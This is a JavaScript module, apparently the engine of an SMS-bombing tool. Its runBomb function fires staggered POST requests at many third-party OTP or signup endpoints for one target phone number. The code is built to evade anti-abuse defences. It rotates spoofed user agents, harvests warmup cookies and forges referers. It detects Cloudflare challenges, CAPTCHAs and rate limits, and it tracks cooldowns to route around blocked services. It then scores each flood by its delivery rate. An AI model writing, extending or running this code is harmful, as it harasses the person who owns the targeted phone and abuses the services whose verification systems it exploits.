import { PROVIDERS } from './providers.js';
import * as store from './store.js';

const UAS = [
  'Mozilla/5.0 (Linux; Android 13; SM-A536E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const CF = /just a moment|cf-chl|checking your browser|attention required/i;
const CAPTCHA = /captcha|recaptcha|turnstile|hcaptcha/i;
const RATE = /too many|already (sent|requested|registered)|limit reached|throttl|try again|retry after|slow down/i;

const rand = (a, b) => a + Math.random() * (b - a);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const pick = (a) => a[Math.floor(Math.random() * a.length)];
const clamp = (v, lo, hi) => Math.min(Math.max(v, lo), hi);
const hdrs = (p) => (typeof p.headers === 'function' ? p.headers() : p.headers || {});

function encode(p, phone, url) {
  const raw = p.body(phone);
  if (p.mode === 'query') {
    const u = new URL(url);
    for (const [k, v] of Object.entries(raw)) if (v) u.searchParams.set(k, v);
    return { url: u.toString(), body: null, ct: null };
  }
  if (p.mode === 'form') {
    return { url, body: new URLSearchParams(raw).toString(), ct: 'application/x-www-form-urlencoded' };
  }
  return { url, body: JSON.stringify(raw), ct: 'application/json' };
}

async function warmup(p) {
  if (!p.warmup) return '';
  try {
    const res = await fetch(p.warmup, {
      headers: { 'user-agent': pick(UAS), accept: 'text/html', 'accept-language': 'en-PK,en;q=0.9' },
      signal: AbortSignal.timeout(3500),
      redirect: 'follow',
    });
    const sc = res.headers.get('set-cookie');
    if (!sc) return '';
    return sc.split(',').map((c) => c.split(';')[0].trim()).join('; ');
  } catch {
    return '';
  }
}

function classify(p, status, txt, ct) {
  if (status === 429 || RATE.test(txt)) return 'limited';
  if (status === 401 || status === 403) return CF.test(txt) ? 'challenge' : 'blocked';
  if (status === 404 || status === 405) return 'missing';
  if (CAPTCHA.test(txt) && status >= 400) return 'captcha';
  if (status >= 500) return 'server_error';
  if (status >= 200 && status < 300 && p.ok.test(txt)) return 'sent';
  if (ct && /html/i.test(ct) && !p.ok.test(txt)) return 'html_response';
  return 'fail';
}

async function attempt(p, phone, url, cookie) {
  const enc = encode(p, phone, url);
  const headers = {
    'user-agent': pick(UAS),
    accept: 'application/json, text/plain, */*',
    'accept-language': 'en-PK,en;q=0.9,ur;q=0.8',
    referer: p.warmup || new URL(enc.url).origin + '/',
    ...(enc.ct ? { 'content-type': enc.ct } : {}),
    ...(cookie ? { cookie } : {}),
    ...hdrs(p),
  };
  try {
    const res = await fetch(enc.url, {
      method: 'POST',
      headers,
      body: enc.body,
      signal: AbortSignal.timeout(4000),
      redirect: 'follow',
    });
    const txt = (await res.text()).slice(0, 4000);
    return { status: res.status, txt, ct: res.headers.get('content-type') || '' };
  } catch (e) {
    return { status: 0, txt: '', ct: '', err: e.name === 'TimeoutError' ? 'timeout' : 'network' };
  }
}

export async function hit(p, phone) {
  const base = { id: p.id, name: p.name, tier: p.tier, category: p.category };
  if (p.available && !p.available()) return { ...base, result: 'disabled' };

  const cdKey = `cd:${p.id}`;
  const state = await store.get(cdKey);
  if (state === 'blocked' || state === 'limited') return { ...base, result: 'cooldown' };

  const cookie = await warmup(p);
  let last = { ...base, result: 'fail' };

  for (const url of p.urls) {
    let r = await attempt(p, phone, url, cookie);
    if (r.err === 'network' || r.err === 'timeout') {
      await sleep(rand(100, 250));
      r = await attempt(p, phone, url, cookie);
    }
    if (r.err) { last = { ...base, result: r.err }; continue; }

    const v = classify(p, r.status, r.txt, r.ct);
    last = { ...base, result: v, status: r.status };

    if (v === 'sent') { await store.set(cdKey, 'ok', p.cooldown); return last; }
    if (v === 'limited') { await store.set(cdKey, 'limited', Math.min(p.cooldown * 2, 600)); return last; }
    if (v === 'blocked' || v === 'challenge') { await store.set(cdKey, 'blocked', 900); return last; }
    if (v !== 'missing') { last.peek = r.txt.slice(0, 120); return last; }
  }
  return last;
}

export async function runBomb(phone, opts = {}) {
  const count = clamp(Number(opts.count) || 20, 1, 26);
  const stagger = clamp(Number(opts.stagger) || 140, 60, 400);
  const tier = opts.tier === 'all' || opts.tier === 'extra' ? opts.tier : 'core';
  const only = opts.only ? String(opts.only).split(',').map((s) => s.trim()) : null;
  const skip = opts.skip ? String(opts.skip).split(',').map((s) => s.trim()) : null;

  let pool = PROVIDERS.filter((p) => {
    if (only) return only.includes(p.id);
    if (tier === 'core') return p.tier === 'core';
    return true;
  }).filter((p) => !skip || !skip.includes(p.id));

  if (!pool.length) pool = PROVIDERS.filter((p) => p.tier === 'core');
  pool = [...pool].sort(() => Math.random() - 0.5).slice(0, count);

  const t0 = Date.now();
  const tasks = pool.map((p, i) => sleep(i * stagger).then(() => hit(p, phone)));
  const out = await Promise.all(tasks);

  const report = { phone: phone.e164, tier, requested: pool.length, sent: 0, limited: 0, failed: 0, results: out };
  for (const r of out) {
    if (r.result === 'sent') report.sent++;
    else if (r.result === 'limited' || r.result === 'cooldown') report.limited++;
    else report.failed++;
  }
  report.took_ms = Date.now() - t0;
  report.delivery_rate = pool.length ? +((report.sent / pool.length) * 100).toFixed(1) : 0;
  report.verdict = report.sent >= 8 ? 'strong' : report.sent >= 4 ? 'ok' : report.sent >= 1 ? 'weak' : 'dead';
  return report;
               }
